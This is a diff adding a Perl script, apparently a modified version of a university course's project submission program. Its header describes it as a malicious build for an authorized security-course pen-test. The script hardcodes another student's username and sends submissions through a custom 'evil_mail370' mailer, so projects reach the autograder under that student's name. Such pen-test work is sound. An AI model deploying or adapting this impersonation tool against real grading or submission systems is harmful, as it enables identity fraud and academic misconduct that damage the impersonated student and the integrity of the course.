@@ -1,0 +1,319 @@
+#!/usr/bin/perl
+
+# This is a malicious version of the EECS370 submission program, produced for an authorized EECS588 pen-test. -ayarger@umich.edu
+# It's primary feature is impersonation-- submitting programs under the name of others.
+# submit a set of files
+
+# usage: submit370 <project-part> <file-name> ...
+
+use English;
+
+use Email::Date::Format qw(email_date);
+
+my $edate = email_date;
+
+# print "Sorry, the submission mechanism is temporarily unavailable.\n";
+#  print "I'm still trying to fix it, but have no clues at the moment.\n";
+#  print "I will announce on the newsgroup when it starts to work.\n";
+#  print "  -- Mark \n";
+#  exit(1);
+
+sub cleanAndExit() {
+    # clean up submission directory (should only be called after $submit is
+    # defined)
+
+    my $status = shift(@_);
+
+    if (! defined($submit) || ! defined($rm) || ! defined($cwd) ) {
+        print "submit or rm or cwd undefined.  Notify instructor.\n";
+	exit(1);
+    }
+
+    # change back to the original directory submit370 was run from (otherwise
+    # can't remove $submit, since I'm in it)
+    if (! chdir "$cwd") {
+        print "error chdir'ing to $cwd.  Notify instructor.\n";
+	exit(1);
+    }
+
+    if (system("$rm -rf $submit $submit.mail")) {
+	print "Unable to remove temporary submission directory $submit and $submit.mail\n";
+	print "Please remove $submit and $submit.mail by hand\n";
+	exit(1);
+    }
+
+    # print "cleanAndExit exiting with status $status\n";
+    exit($status);
+}
+
+$dest = "eecs370\@grader8.eecs.umich.edu";
+$cwd = `pwd`;
+chomp($cwd);
+umask(077);
+
+# find standard executables (so I don't have to rely on $path)
+foreach $command ("rm", "tar", "uuencode", "uudecode") {
+    foreach $dir ("/usr/bin", "/bin", "/usr/lib", "/usr/sbin", "/usr/local/bin", "/afs/umich.edu/class/eecs370/bin") {
+        if (-e "$dir/$command" && -x "$dir/$command") {
+	    $commandList{$command} = "$dir/$command";
+	    last;
+	}
+    }
+    if (!defined($commandList{$command})) {
+        print "Couldn't find the $command command on this machine.  Are you\n";
+	print "running on a standard CAEN or ITD machine?  If so, notify\n";
+	print "instructor about this error.\n";
+	exit(1);
+    }
+    # print "commandList{$command} = $commandList{$command}\n";
+}
+$rm = $commandList{"rm"};
+$tar = $commandList{"tar"};
+$uuencode = $commandList{"uuencode"};
+$uudecode = $commandList{"uudecode"};
+
+if (@ARGV < 2 ||
+    ($ARGV[0] ne "1a" && $ARGV[0] ne "1s" && $ARGV[0] ne "1m" &&
+     $ARGV[0] ne "2s" && $ARGV[0] ne "2c" && $ARGV[0] ne "2z" &&
+     $ARGV[0] ne "2t" && $ARGV[0] ne "2d" && $ARGV[0] ne "2y" &&
+     $ARGV[0] ne "3a" && $ARGV[0] ne "4a" &&
+     $ARGV[0] ne "3"  && $ARGV[0] ne  "4") ) {
+
+    print "error: usage: submit370 <project-part> <file-name> ...\n";
+    print "valid choices for <project-part>:\n";
+    print "    Project 1 assembler and assembler test suite: 1a\n";
+    print "    Project 1 simulator and simulator test suite: 1s\n";
+    print "    Project 1 multiplication assembly program: 1m\n";
+    print "    Project 2 combination assembly program: 2c\n";
+    print "    Project 2 contest submission: 2z\n";
+    print "    Project 2 simulator: 2s\n";
+    print "    Project 3 simulator and simulator test suite: 3\n";
+    print "    Project 4 simulator and simulator test suite: 4\n";
+    exit(1);
+}
+
+$ARGV[0] =~ /(.)/;
+$proj = $1;
+
+# print "project number $proj\n";
+
+# if ($proj != 4) { 
+# # if (($proj != 2) && ($proj != 3)) {
+# # if ($proj != 1 && $proj != 2 && $proj != 3 && $proj != 4) {
+#     print "Not accepting submissions for Project $proj\n";
+#     exit(1);
+# }
+
+# construct submission directory
+# + Student impersonation.
+$user = "ipudney";
+$submit = "/tmp/submit370.$user.$PID";
+# print "temporary submission directory $submit\n";
+
+if (-e $submit) {
+    # print "removing old temporary submission directory $submit\n";
+    if (system("$rm -rf $submit $submit.mail")) {
+        print "Unable to remove old temporary submission directory $submit and $submit.mail\n";
+	print "Try submitting from a different computer.\n";
+	exit(1);
+    }
+}
+
+if (! mkdir $submit, 0700) {
+    print "Can't mkdir $submit (maybe /tmp is full).\n";
+    print "Try submitting from a different computer.\n";
+    exit(1);
+}
+
+# link files into temporary submission directory
+
+print "Preparing to submit the following files:\n";
+for ($i = 1; $i < @ARGV; $i++) {
+    $file = $ARGV[$i];
+    print "\t$file\n";
+
+    # error checks for specific projects
+    if ($ARGV[0] eq "1m" || $ARGV[0] eq "2c" || $ARGV[0] eq "2s") {
+        if ($i > 1) {
+	    print "error: this project part requires exactly one file to be submitted\n";
+	    &cleanAndExit(1);
+	}
+    }
+
+    # print "linking $file into temporary submission directory\n";
+
+    # use absolute path names for link, since the tar will be done from
+    # within the submission directory
+    if (! ($file =~ /^\//) ) {
+        # add $cwd as prefix
+	$file = "$cwd/$file";
+    }
+
+    # print "linking to $file\n";
+
+    # make sure file is a good file
+    if (! -e $file) {
+        print "error: $file doesn't exist\n";
+	&cleanAndExit(1);
+    } elsif (! -r $file) {
+        print "error: $file is not readable\n";
+	&cleanAndExit(1);
+    } elsif (! -f $file) {
+        print "error: $file is not a plain file\n";
+	&cleanAndExit(1);
+    }
+    # figure out basename
+    $file =~ /.*\/(.*)$/;
+    $base = $1;
+
+    # print "base = $base\n";
+
+    # make sure file's basename does not already appear
+    if (defined($baseList{$base})) {
+        print "Sorry, no duplicate names are allowed (you have two files named $base).\n";
+	&cleanAndExit(1);
+    }
+    $baseList{$base} = 1;
+
+    # make sure only one file has ".c" ending
+    if ($base =~ /\.c$/) {
+        if ($cFile) {
+	    print "Only one file should have .c ending\n";
+	    &cleanAndExit(1);
+	}
+        $cFile = 1;
+    } elsif ($ARGV[0] eq "4") {
+        # for project 4 test cases (not .c file), check for appropriately
+	# named test cases
+	if ($base =~ /(.+)\.(\d+)\.(\d+)\.(\d+)$/) {
+	    $blockSizeInWords = $2;
+	    $numberOfSets = $3;
+	    $blocksPerSet = $4;
+	    # check for sensible cache parameters
+
+	    if ($blockSizeInWords <= 0 || $numberOfSets <= 0 || $numberOfSets > 256 || $blocksPerSet <= 0
+		    || $blocksPerSet > 256) {
+		print "blockSizeInWords must be > 0; numberOfSets and blocksPerSet must be > 0 and <= 256\n";
+		&cleanAndExit(1);
+	    }
+
+	    foreach $param ($blockSizeInWords, $numberOfSets, $blocksPerSet) {
+	        for ( ; $param > 1; $param /= 2) {
+		    if ($param%2) {
+		        print "blockSizeInWords, numberOfSets, blocksPerSet must all be powers of 2\n";
+			&cleanAndExit(1);
+		    }
+		}
+	    }
+	} else {
+	    print "malformed test case name\n";
+	    &cleanAndExit(1);
+	}
+    }
+
+    # make sure file has no strange characters
+    if ($base =~ /[^-\@\w.]/) {
+        print "error: $base has strange characters\n";
+	&cleanAndExit(1);
+    }
+
+    if (! symlink $file, "$submit/$base") {
+        print "symlink error on $file (maybe /tmp is full).\n";
+	print "Try submitting from another computer.\n";
+	&cleanAndExit(1);
+    }
+}
+
+$overloadmsg = "
+This system is overloaded so your submission will probably fail!
+Please try submitting from another computer.
+";
+
+$loadlimit = 40.0;
+@loads = split(' ', `cat /proc/loadavg`);
+if (($loads[0] > $loadlimit) ||
+    ($loads[1] > $loadlimit) ||
+    ($loads[2] > $loadlimit)) {
+  die $overloadmsg;
+}
+
+print "Submit these files?  Type y or RETURN to submit, anything else to abort:\n";
+
+$input = getc(STDIN);
+
+if ($input ne "\n" && $input ne "y") {
+    print "aborted\n";
+    &cleanAndExit(0);
+}
+
+if (! chdir "$submit") {
+    print "error chdir'ing to $submit.  Notify instructor\n";
+    &cleanAndExit(1);
+}
+
+# create the mail file, start it with the right headers.
+if (! open(MAILFILE, "> $submit.mail")) {
+    print "error opening $submit.mail.  Notify instructor\n";
+    &cleanAndExit(1);
+}
+
+print MAILFILE "To: $dest\n";
+print MAILFILE "Subject: $ARGV[0]\n";
+print MAILFILE "Date: $edate\n";
+print MAILFILE "\n";
+
+close(MAILFILE);
+
+# append the uuencoded tar file.  I used to do "tar | uuencode | Mail", but
+# that failed non-deterministically on CAEN (possibly because Mail timed out
+# when uuencode was slow to give data?).  It seems to be more reliable to
+# first create the uuencoded tar file, then give the completed file to a
+# python script to mail it.
+
+# print "\nCOMMAND DUMP BEGIN\n";
+# print $tar, "\n";
+# print $uuencode, "\n";
+# print submit370.$user.$PID, "\n";
+# print "$tar chf - . | $uuencode submit370.$user.$PID >> $submit.mail", "\n";
+# print "COMMAND DUMP END\n\n";
+
+`$tar chf - . | $uuencode submit370.$user.$PID >> $submit.mail`;
+if ($CHILD_ERROR) {
+    print "tar|uuencode failed.  Please notify instructor\n";
+    print "(include the computer's hostname you submitted from)\n";
+    exit(1);
+    # &cleanAndExit(1);
+}
+
+# check that uudecode works.  Check stderr because "invalid character" messages
+# go there without returning bad status (gnu's uudecode fails silently!).
+#
+# Only check on SunOS, since other systems use different uudecode options
+if (`uname` eq "SunOS\n") {
+    $status = `$uudecode -p $submit.mail 2>&1 1>/dev/null`;
+    if ($status ne "" || $CHILD_ERROR) {
+	print "$status";
+	print "uudecode failed.  Please notify instructor.\n";
+	print "(include the computer's hostname you submitted from)\n";
+	exit(1);
+	# &cleanAndExit(1);
+    }
+}
+
+# mail the uuencoded tar file
+print "\nMailing your submission to the autograder ...\n";
+
+$status = `/home/ayarger/eecs588/evil_mail370 < $submit.mail`;
+print $submit.mail . "\n";
+if ($CHILD_ERROR) {
+    print $status;
+    print "mailer failed.  Please notify instructor\n";
+    print "(include the computer's hostname you submitted from)\n";
+    exit(1);
+    # &cleanAndExit(1);
+}
+
+print "\nSubmission successful.  You should receive an acknowledgment\n";
+print "from $dest for this submission.\n";
+
+&cleanAndExit(0);
